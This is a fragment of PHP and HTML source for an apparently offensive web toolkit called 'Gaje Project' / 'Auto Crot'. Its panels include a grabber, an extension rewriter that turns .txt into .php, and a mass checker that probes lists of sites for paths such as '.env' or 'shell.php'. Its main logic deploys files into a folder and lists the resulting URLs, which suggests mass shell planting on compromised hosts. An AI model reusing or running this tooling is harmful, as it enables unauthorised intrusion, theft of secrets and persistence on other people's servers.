      <textarea id="grabber-result" class="result" rows="10"><?php echo htmlspecialchars($grabber_output); ?></textarea>
      <div class="btn secondary" onclick="copyTxt('grabber-result')">Copy to Clipboard</div>
      <?php endif; ?>
    </div>

    <div class="panel" id="panel-ext">
      <h3>EXT Generator</h3>
      <div class="small">Replaces or appends text to each line from a list of URLs.</div>
      <form method="POST" action="">
        <input type="hidden" name="action" value="ext_generate">
        <div class="flex">
          <div class="col">
            <label for="urllist">URL List</label>
            <textarea name="urllist" placeholder="http://domain.com/file.txt..."><?php echo htmlspecialchars($_POST['urllist'] ?? ''); ?></textarea>
          </div>
          <div class="col">
            <label for="oldext">Old Extension (Optional)</label>
            <input type="text" name="oldext" class="input" placeholder=".txt" value="<?php echo htmlspecialchars($_POST['oldext'] ?? ''); ?>">
            <label for="newext">New Extension</label>
            <input type="text" name="newext" class="input" placeholder=".php" value="<?php echo htmlspecialchars($_POST['newext'] ?? ''); ?>">
            <button type="submit" class="btn">Generate</button>
            <?php if (file_exists('ext.txt') && filesize('ext.txt') > 0): ?>
              <a href="ext.txt" target="_blank" class="download" style="margin-left:10px;">Download ext.txt (<?php echo filesize('ext.txt'); ?> bytes)</a>
            <?php endif; ?>
          </div>
        </div>
      </form>
      
      <?php if (!empty($ext_output)): ?>
      <label style="margin-top:15px;">Results</label>
      <textarea id="ext-result" class="result" rows="10"><?php echo htmlspecialchars($ext_output); ?></textarea>
      <div class="btn secondary" onclick="copyTxt('ext-result')">Copy to Clipboard</div>
      <?php endif; ?>
    </div>

    <div class="panel" id="panel-checker">
      <h3>Mass Checker</h3>
      <div class="small">Checks a list of URLs for a specific path and keyword.</div>
      <form method="POST" action="">
        <input type="hidden" name="action" value="mass_check">
        <label>URL List</label>
        <textarea name="urls" rows="8" placeholder="Enter list of URLs, one per line..."><?php echo htmlspecialchars($_POST['urls'] ?? ''); ?></textarea>
        
        <div class="flex">
            <div class="col">
                <label>Path / File</label>
                <input name="ext" class="input" placeholder="Example: .env or shell.php" value="<?php echo htmlspecialchars($_POST['ext'] ?? ''); ?>">
            </div>
            <div class="col">
                <label>Keyword</label>
                <input name="keyword" class="input" placeholder="Keyword (optional, checks HTTP 200 if empty)" value="<?php echo htmlspecialchars($_POST['keyword'] ?? ''); ?>">
            </div>
            <div class="col">
                <label>Target Mode</label>
                <select name="target_mode" class="input">
                    <option value="root" <?php echo (($_POST['target_mode'] ?? 'root') == 'root') ? 'selected' : ''; ?>>Append to Domain Root</option>
                    <option value="path" <?php echo (($_POST['target_mode'] ?? '') == 'path') ? 'selected' : ''; ?>>Append to URL Path</option>
                </select>
            </div>
            <div class="col">
                <label>Scan Mode</label>
                <select name="mode" class="input">
                    <option value="normal" <?php echo (($_POST['mode'] ?? 'normal') == 'normal') ? 'selected' : ''; ?>>Normal Mode (Stable, Slower)</option>
                    <option value="fast" <?php echo (($_POST['mode'] ?? '') == 'fast') ? 'selected' : ''; ?>>Fast Mode (Super Fast, cURL)</option>
                </select>
            </div>
        </div>
        <button type="submit" class="btn">Scan Now</button>
      </form>

      <?php if (!empty($checker_output)): ?>
        
        <label style="margin-top:15px;">Live Scan Log</label>
        <div class="checker-result">
          <?php echo $checker_output; // This contains live HTML output ?>
        </div>
        
        <?php if (!empty($checker_found_list_string)): ?>
          <label style="margin-top:15px;">Found Results (List)</label>
          <textarea id="checker-result-list" class="result" rows="8"><?php echo htmlspecialchars($checker_found_list_string); ?></textarea>
          <div class="btn secondary" onclick="copyTxt('checker-result-list')">Copy to Clipboard</div>
        <?php endif; ?>

      <?php endif; ?>
    </div>
  </div> <div class="footer">
    0x6ick — Gaje Project v1.0
  </div>
</div>
</body>
</html>
PHP;
}
// ---------------- Main Logic ----------------
$urls = deployFolder($folderName, $files);

// Pisahkan berdasarkan ekstensi
$resultGroups = [];
foreach ($urls as $url) {
    // pastikan parse_url berhasil, kadang fallback ke 'no_ext'
    $path = parse_url($url, PHP_URL_PATH) ?: '';
    $ext = pathinfo($path, PATHINFO_EXTENSION);
    if (!$ext) $ext = 'no_ext';
    $resultGroups[$ext][] = $url;
}

//result.txt
$txtOutput = "";
foreach ($resultGroups as $ext => $list) {
    $txtOutput .= "---$ext result----\n";
    foreach ($list as $u) {
        $txtOutput .= "$u\n";
    }
    $txtOutput .= "\n";
}

//save
file_put_contents(__DIR__ . '/result.txt', $txtOutput);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Auto Crot - GajeProject</title>
<style>
body {
    font-family: monospace;
    background: #111;
    color: #f0f0f0;
    padding: 20px;
}
h2 { color: #ff0000; } /* Trash polka red */
h3 { color: #0ff; margin-top: 20px; }
.file-entry { margin-bottom: 5px; word-break: break-word; }
button {
    margin-left: 10px;
    padding: 3px 8px;
    cursor: pointer;
    border-radius: 3px;
    border: none;
    background: #ff0000;
    color: #fff;
    font-weight: bold;
}
button:hover { background: #cc0000; }
.copy-all {
    margin-bottom: 10px;
    padding: 5px 12px;
    background: #0ff;
    color: #000;
}
</style>
<script>
function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Copied!');
    }, () => {
        alert('Copy failed');
    });
}

// Copy all URLs per ekstensi
function copyAll(ext) {
    const urls = Array.from(document.querySelectorAll(`.group-${ext} .url`)).map(e => e.innerText).join("\n");
    copyText(urls);
}
</script>
</head>
<body>

<h2>Deployment Complete!</h2>
<p>check: <strong>result.txt</strong></p>

<?php if (empty($urls)): ?>
    <p>No deployment done. Check permissions or folder structure.</p>
<?php else: ?>
    <?php foreach ($resultGroups as $ext => $group): ?>
        <h3>--<?= htmlspecialchars($ext) ?> result--</h3>
        <button class="copy-all" onclick="copyAll('<?= htmlspecialchars($ext) ?>')">Copy All</button>
        <div class="group-<?= htmlspecialchars($ext) ?>">
        <?php foreach ($group as $url): ?>
            <div class="file-entry">
                <span class="url"><?= htmlspecialchars($url) ?></span>
            </div>
        <?php endforeach; ?>
        </div>
    <?php endforeach; ?>
<?php endif; ?>

<hr>
<footer>
    <strong>Auto Crot</strong> — <strong>Gaje Project</strong><br>
    <em>“6ickzone”</em>
</footer>

</body>
</html>
